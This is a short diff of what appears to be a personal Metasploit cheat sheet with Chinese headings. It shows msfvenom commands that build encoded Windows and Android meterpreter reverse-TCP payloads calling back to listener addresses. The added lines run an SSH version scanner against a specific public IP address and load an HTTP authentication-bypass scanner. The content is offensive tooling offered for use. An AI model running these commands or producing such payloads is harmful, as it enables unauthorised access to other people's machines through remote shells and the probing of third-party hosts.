@@ -43,3 +43,8 @@ windows
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.1.152 LPORT=443 -f exe > c.exe
 android
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=5555 R > /root/apk.apk
+ssh 扫描
+use auxiliary/scanner/ssh/ssh_version
+show options
+set rhosts 47.102.207.75
+use auxiliary/scanner/http/verb_auth_bypass #http绕过
